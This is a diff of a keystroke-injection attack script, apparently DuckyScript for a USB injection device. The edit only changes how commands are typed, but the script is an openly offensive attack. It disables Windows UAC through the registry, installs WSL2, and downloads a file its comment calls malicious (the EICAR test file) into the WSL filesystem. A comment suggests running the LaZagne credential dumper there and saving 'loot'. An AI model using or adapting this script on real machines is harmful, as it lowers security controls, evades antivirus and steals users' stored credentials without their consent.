@@ -30,15 +30,18 @@ ALT y
 DELAY 200
 
 REM Disabling the UAC (wsl --install would ask for it)
-STRINGLN Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+STRING Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+ENTER
 
 REM We do not need to enable these, but here for reference. wsl --install will automatically enable VirtualMachinePlatform
 REM STRINGLN dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
 REM STRINGLN dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
 
 REM Install WSL2
-STRINGLN wsl --install
-STRINGLN wsl --install Ubuntu
+STRING wsl --install
+ENTER
+STRING wsl --install Ubuntu
+ENTER
 
 REM We wait for the above two comanads to finish, at the end of "wsl --install Ubuntu" it will ask you to create username:password for Ubuntu, we don't have to provide it
 DELAY 55000
@@ -46,7 +49,8 @@ CTRL c
 
 REM in Windows 10 the path may look different 
 REM download malicious file to the WSL2 distro
-STRINGLN wget https://secure.eicar.org/eicar.com.txt -O Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\Ubuntu\eicar.com.txt
+STRING wget https://secure.eicar.org/eicar.com.txt -O Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\Ubuntu\eicar.com.txt
+ENTER
 
 REM at this point you may execute the file downloaded above
 REM for example powershell -c "Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\Ubuntu\LaZagne.exe all -vv > "Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\Ubuntu\loot.txt";
